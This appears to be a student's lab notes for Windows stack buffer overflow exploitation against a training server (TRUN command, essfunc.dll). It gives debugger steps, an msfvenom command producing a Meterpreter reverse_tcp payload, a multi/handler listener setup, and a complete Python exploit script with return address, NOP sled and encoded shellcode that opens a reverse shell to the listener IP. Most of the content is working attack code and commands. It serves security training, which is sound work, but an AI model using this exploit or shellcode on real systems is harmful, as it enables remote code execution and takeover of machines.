###################################################################################################################################################################################################

                                                                                      #Windows Exploit Development#

###################################################################################################################################################################################################

#Steps
    Drag and Drop file onto immunity debugger
    
    Work in CPU - main thread
        
    Win_buf script written on lin ops
        go in and add 5000 chars from the wiremask.eu
        Find EIP in immunity debugger, and then use it to see how many needed to overflow
        run !mona jmp -r esp -m "essfunc.dll" in bottom bar of immunity
            #gives lit of jump esps
            copy first jump esp, just address and then go back to python script to add it
   
   Generate shell code
      Launch msfconsole
          msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.114 lport=4444 -b"\xoo" -f python
          #add all but buf = b"" line to script then 
      msfconsole
      use multi/handler
      show options
      set payload windows/meterpreter/reverse_tcp
      set LHOST <LIN OPS IP> (10.50.23.114)
      exploit
          #re-run the exe on the widnows device before exploit may not connect due to it being crashed before
      shell

SCRIPT
#!/usr/bin/python

import socket

buf = "TRUN /.:/"               #2002 vs 2003 will be specified after the /.:/

buf += "A" * 2003
buf += "\xAD\x12\x50\x62"
buf += "\x90" * 10
#625012AD
buf += b"\xd9\xcd\xd9\x74\x24\xf4\xb8\x82\x93\x71\xc2\x5e"
buf += b"\x31\xc9\xb1\x59\x31\x46\x19\x83\xc6\x04\x03\x46"
buf += b"\x15\x60\x66\x8d\x2a\xeb\x89\x6e\xab\x93\xb8\xbc"
buf += b"\x22\xb6\xdf\xcb\x67\x08\xab\x9e\x8b\xe3\xf9\x0a"
buf += b"\x1f\x81\xd5\x03\xe0\x6a\x91\x2e\x38\x45\x1d\x02"
buf += b"\x78\xc4\xe1\x59\xad\x26\xdb\x91\xa0\x27\x1c\x64"
buf += b"\xce\xc8\xf0\x20\xbb\x44\xe5\x45\xf9\x54\x04\x8a"
buf += b"\x75\xe4\x7e\xaf\x4a\x90\x32\xae\x9a\x08\x40\xf8"
buf += b"\x02\x23\x0e\xd9\x33\xe0\x2a\xd0\x40\x3a\x04\x1c"
buf += b"\xe1\xc9\x52\x69\xf3\x1b\xab\xad\x35\x6c\xc1\x81"
buf += b"\xb7\xb5\xe2\x39\xc2\xcd\x10\xc7\xd5\x16\x6a\x13"
buf += b"\x53\x88\xcc\xd0\xc3\x6c\xec\x35\x95\xe7\xe2\xf2"
buf += b"\xd1\xaf\xe6\x05\x35\xc4\x13\x8d\xb8\x0a\x92\xd5"
buf += b"\x9e\x8e\xfe\x8e\xbf\x97\x5a\x60\xbf\xc7\x03\xdd"
buf += b"\x65\x8c\xa6\x08\x19\x6d\x39\x35\x47\xf9\xf5\xf8"
buf += b"\x78\xf9\x91\x8b\x0b\xcb\x3e\x20\x84\x67\xb6\xee"
buf += b"\x53\xfe\xd0\x10\x8b\xb8\xb1\xee\x2c\xb8\x98\x34"
buf += b"\x78\xe8\xb2\x9d\x01\x63\x43\x21\xd4\x19\x49\xb5"
buf += b"\xdd\xef\x5a\x37\x8a\x0d\x65\xa6\x16\x98\x83\x98"
buf += b"\xf6\xca\x1b\x59\xa7\xaa\xcb\x31\xad\x25\x33\x21"
buf += b"\xce\xec\x5c\xc8\x21\x58\x34\x65\xdb\xc1\xce\x14"
buf += b"\x24\xdc\xaa\x17\xae\xd4\x4b\xd9\x47\x9d\x5f\x0e"
buf += b"\x30\x5d\xa0\xcf\xd5\x5d\xca\xcb\x7f\x0a\x62\xd6"
buf += b"\xa6\x7c\x2d\x29\x8d\xff\x2a\xd5\x50\xc9\x41\xe0"
buf += b"\xc6\x75\x3e\x0d\x07\x75\xbe\x5b\x4d\x75\xd6\x3b"
buf += b"\x35\x26\xc3\x43\xe0\x5b\x58\xd6\x0b\x0d\x0c\x71"
buf += b"\x64\xb3\x6b\xb5\x2b\x4c\x5e\xc5\x2c\xb2\x1c\xe2"
buf += b"\x94\xda\xde\xb2\x24\x1a\xb5\x32\x75\x72\x42\x1c"
buf += b"\x7a\xb2\xab\xb7\xd3\xda\x26\x56\x91\x7b\x36\x73"
buf += b"\x77\x25\x37\x70\xac\xd6\x42\xf9\x53\x17\xb3\x13"
buf += b"\x30\x18\xb3\x1b\x46\x25\x65\x22\x3c\x68\xb5\x11"
buf += b"\x4f\xdf\x98\x30\xda\x1f\x8e\x43\xcf"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the Ipv4 socket, TCP protocol
s.connect(("10.50.26.163", 9999))   #Connect to target ip and port
print s.recv(1024)                  #Prints Response
s.send(buf)                         #Send the value of buf
print s.recv(1024)                  #Print Response
s.close()                           #closes the socket
~                                                               
